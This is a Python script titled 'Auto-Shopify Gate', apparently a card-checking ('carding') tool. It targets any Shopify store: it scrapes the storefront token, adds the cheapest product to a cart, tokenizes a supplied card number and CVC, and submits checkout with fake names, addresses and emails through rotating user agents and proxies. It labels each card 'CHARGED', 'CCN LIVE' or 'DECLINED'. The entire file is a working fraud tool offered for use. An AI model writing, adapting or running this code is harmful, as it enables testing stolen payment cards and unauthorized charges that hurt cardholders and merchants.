"""
Auto-Shopify Gate - Works with ANY Shopify store
Automatically finds a product and processes checkout
"""

import asyncio
import httpx
import random
import time
import json
from urllib.parse import urlparse

C2C = {
    "USD": "US",
    "CAD": "CA",
    "INR": "IN",
    "AED": "AE",
    "HKD": "HK",
    "GBP": "GB",
    "CHF": "CH",
}

ADDRESSES = {
    "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586", "currencyCode": "USD"},
    "CA": {"address1": "88 Queen St", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198", "currencyCode": "CAD"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123", "currencyCode": "GBP"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567", "currencyCode": "AUD"},
    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586", "currencyCode": "USD"},
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6400.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6400.120 Safari/537.36",
]

def capture(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

def get_product_id(response_json):
    try:
        products_data = response_json.get("products", [])
        products = {}
        for product in products_data:
            variants = product.get("variants", [])
            if not variants:
                continue
            variant = variants[0]
            product_id = variant.get("id")
            available = variant.get("available", False)
            price = float(variant.get("price", 0))
            if price < 0.1:
                continue
            if available and product_id:
                products[product_id] = price
        if products:
            min_price_product_id = min(products, key=products.get)
            price = products[min_price_product_id]
            return min_price_product_id, price
    except Exception:
        pass
    return None, None

def pick_addr(url, cc=None, rc=None):
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tld = dom.split('.')[-1].upper()
    
    if tld in ADDRESSES:
        return ADDRESSES[tld]
    ccn = C2C.get(cc)
    if rc in ADDRESSES and ccn == rc:
        return ADDRESSES[rc]
    elif rc in ADDRESSES:
        return ADDRESSES[rc]
    return ADDRESSES["DEFAULT"]

def get_platform(ua):
    if "Android" in ua:
        return "Android"
    elif "iPhone" in ua or "iPad" in ua:
        return "iOS"
    elif "Windows" in ua:
        return "Windows"
    return "Unknown"

async def shopify_auto_check(shopify_url: str, card_num: str, card_mon: str, card_yer: str, card_cvc: str, proxy=None, cached_product=None, cached_token=None):
    """
    Auto-Shopify gate that works with any Shopify store URL
    Returns: (status_message, proxy_alive)
    
    Args:
        cached_product: dict with variant_id, price (optional - skips product discovery)
        cached_token: str - storefront token (optional - skips token discovery)
    """
    proxy_alive = "No"
    start_time = time.time()
    
    ua = random.choice(USER_AGENTS)
    platform = get_platform(ua)
    mobile = '?1' if "Android" in ua or "Mobile" in ua else '?0'
    email = random.choice(['stacybot@gmail.com', 'checker@proton.me', 'test@mail.com'])
    
    try:
        parsed = urlparse(shopify_url)
        if not parsed.scheme:
            shopify_url = "https://" + shopify_url
            parsed = urlparse(shopify_url)
        domain = parsed.netloc
        base_url = f"https://{domain}"
        
        proxies = None
        if proxy:
            try:
                parts = proxy.split(':')
                if len(parts) == 4:
                    proxies = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                else:
                    proxies = f"http://{parts[0]}:{parts[1]}"
            except:
                pass
        
        async with httpx.AsyncClient(proxies=proxies, timeout=30, follow_redirects=True, verify=False) as session:
            headers = {"User-Agent": ua}
            
            if cached_product and cached_token:
                product_id = cached_product.get("variant_id")
                price = cached_product.get("price")
                site_key = cached_token
                proxy_alive = "Yes"
            else:
                resp = await session.get(f"{base_url}/products.json", headers=headers)
                
                if resp.status_code != 200:
                    return ("Error: Site unreachable", proxy_alive)
                
                proxy_alive = "Yes"
                
                product_id, price = get_product_id(resp.json())
                if not product_id:
                    return ("Error: No products available", proxy_alive)
                
                resp = await session.get(base_url, headers=headers)
                site_key = capture(resp.text, '"accessToken":"', '"')
            
            if not site_key:
                return ("Error: No storefront token", proxy_alive)
            
            headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': base_url,
                'user-agent': ua,
                'x-shopify-storefront-access-token': site_key,
            }
            
            cart_mutation = {
                'query': 'mutation cartCreate($input:CartInput!$country:CountryCode$language:LanguageCode)@inContext(country:$country language:$language){result:cartCreate(input:$input){cart{id checkoutUrl}errors:userErrors{message field code}}}',
                'variables': {
                    'input': {
                        'lines': [{'merchandiseId': f'gid://shopify/ProductVariant/{product_id}', 'quantity': 1}],
                        'discountCodes': [],
                    },
                    'country': 'US',
                    'language': 'EN',
                },
            }
            
            resp = await session.post(f'{base_url}/api/unstable/graphql.json', headers=headers, json=cart_mutation)
            resp_data = resp.json()
            
            checkout_url = resp_data.get("data", {}).get("result", {}).get("cart", {}).get("checkoutUrl")
            if not checkout_url:
                return ("Error: Cart creation failed", proxy_alive)
            
            await asyncio.sleep(0.5)
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'user-agent': ua,
                'sec-ch-ua-platform': f'"{platform}"',
            }
            
            resp = await session.get(checkout_url, headers=headers, params={'auto_redirect': 'false'})
            
            paymentMethodIdentifier = capture(resp.text, "paymentMethodIdentifier&quot;:&quot;", "&quot")
            stable_id = capture(resp.text, "stableId&quot;:&quot;", "&quot")
            queue_token = capture(resp.text, "queueToken&quot;:&quot;", "&quot")
            currencyCode = capture(resp.text, "currencyCode&quot;:&quot;", "&quot") or "USD"
            countryCode = capture(resp.text, "countryCode&quot;:&quot;", "&quot") or "US"
            x_checkout_session_token = capture(resp.text, 'serialized-session-token" content="&quot;', '&quot')
            source_token = capture(resp.text, 'serialized-source-token" content="&quot;', '&quot')
            
            if not x_checkout_session_token or not stable_id:
                return ("Error: Checkout page parse failed", proxy_alive)
            
            pci_headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': 'https://checkout.pci.shopifyinc.com',
                'user-agent': ua,
            }
            
            card_data = {
                'credit_card': {
                    'number': card_num,
                    'month': int(card_mon),
                    'year': int(card_yer) if len(card_yer) == 4 else int(f"20{card_yer}"),
                    'verification_value': card_cvc,
                    'name': 'John Doe',
                },
                'payment_session_scope': domain,
            }
            
            resp = await session.post('https://checkout.pci.shopifyinc.com/sessions', headers=pci_headers, json=card_data)
            
            if resp.status_code != 200:
                return ("Error: Card tokenization failed", proxy_alive)
            
            session_id = resp.json().get("id")
            if not session_id:
                return ("Error: No session ID", proxy_alive)
            
            addr = pick_addr(base_url, cc=currencyCode, rc=countryCode)
            
            submit_headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': base_url,
                'user-agent': ua,
                'x-checkout-one-session-token': x_checkout_session_token,
                'x-checkout-web-source-id': source_token,
                'shopify-checkout-client': 'checkout-web/1.0',
            }
            
            submit_mutation = {
                'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{id}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter __typename}__typename}}',
                'variables': {
                    'input': {
                        'sessionInput': {'sessionToken': x_checkout_session_token},
                        'queueToken': queue_token,
                        'delivery': {
                            'deliveryLines': [{
                                'destination': {
                                    'partialStreetAddress': {
                                        'address1': addr["address1"],
                                        'city': addr["city"],
                                        'countryCode': addr["countryCode"],
                                        'postalCode': addr["postalCode"],
                                        'firstName': 'John',
                                        'lastName': 'Doe',
                                        'zoneCode': addr["zoneCode"],
                                        'phone': addr["phone"],
                                    }
                                },
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyMatchingConditions': {
                                        'estimatedTimeInTransit': {'any': True},
                                        'shipments': {'any': True},
                                    },
                                },
                                'targetMerchandiseLines': {'any': True},
                                'deliveryMethodTypes': ['SHIPPING'],
                                'expectedTotalPrice': {'any': True},
                            }],
                            'noDeliveryRequired': [],
                            'supportsSplitShipping': True,
                        },
                        'merchandise': {
                            'merchandiseLines': [{
                                'stableId': stable_id,
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': f'gid://shopify/ProductVariantMerchandise/{product_id}',
                                        'variantId': f'gid://shopify/ProductVariant/{product_id}',
                                    },
                                },
                                'quantity': {'items': {'value': 1}},
                                'expectedTotalPrice': {'any': True},
                            }],
                        },
                        'payment': {
                            'totalAmount': {'any': True},
                            'paymentLines': [{
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'paymentMethodIdentifier': paymentMethodIdentifier,
                                        'sessionId': session_id,
                                        'billingAddress': {
                                            'streetAddress': {
                                                'address1': addr["address1"],
                                                'city': addr["city"],
                                                'countryCode': addr["countryCode"],
                                                'postalCode': addr["postalCode"],
                                                'firstName': 'John',
                                                'lastName': 'Doe',
                                                'zoneCode': addr["zoneCode"],
                                                'phone': addr["phone"],
                                            },
                                        },
                                    },
                                },
                                'amount': {'value': {'amount': str(price), 'currencyCode': currencyCode}},
                            }],
                            'billingAddress': {
                                'streetAddress': {
                                    'address1': addr["address1"],
                                    'city': addr["city"],
                                    'countryCode': addr["countryCode"],
                                    'postalCode': addr["postalCode"],
                                    'firstName': 'John',
                                    'lastName': 'Doe',
                                    'zoneCode': addr["zoneCode"],
                                    'phone': addr["phone"],
                                },
                            },
                        },
                        'buyerIdentity': {
                            'email': email,
                            'emailChanged': False,
                        },
                        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                        'taxes': {'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currencyCode}}},
                    },
                    'attemptToken': f'{source_token}-auto',
                },
            }
            
            resp = await session.post(f'{base_url}/api/unstable/graphql.json', headers=submit_headers, json=submit_mutation, params={'operationName': 'SubmitForCompletion'})
            
            elapsed = round(time.time() - start_time, 2)
            result_text = resp.text.lower()
            
            proxy_alive = "Yes"
            
            if "submitsuccess" in result_text or "receipt" in result_text:
                return (f"CHARGED ${price} [{domain}] [{elapsed}s]", proxy_alive)
            elif "insufficient_funds" in result_text or "insufficient funds" in result_text:
                return (f"CCN LIVE - Insufficient Funds [{domain}]", proxy_alive)
            elif "incorrect_cvc" in result_text or "cvc" in result_text or "cvv" in result_text:
                return (f"CCN LIVE - CVV Mismatch [{domain}]", proxy_alive)
            elif "card_declined" in result_text or "declined" in result_text:
                return (f"DECLINED [{domain}]", proxy_alive)
            elif "expired" in result_text:
                return (f"DECLINED - Card Expired [{domain}]", proxy_alive)
            elif "3d_secure" in result_text or "authentication" in result_text:
                return (f"CCN LIVE - 3DS Required [{domain}]", proxy_alive)
            elif "fraud" in result_text or "risk" in result_text:
                return (f"DECLINED - Fraud Risk [{domain}]", proxy_alive)
            else:
                error_msg = capture(resp.text, '"nonLocalizedMessage":"', '"') or "Unknown"
                return (f"DECLINED - {error_msg[:50]} [{domain}]", proxy_alive)
                
    except httpx.TimeoutException:
        return ("Error: Request timeout", proxy_alive)
    except Exception as e:
        return (f"Error: {str(e)[:50]}", proxy_alive)
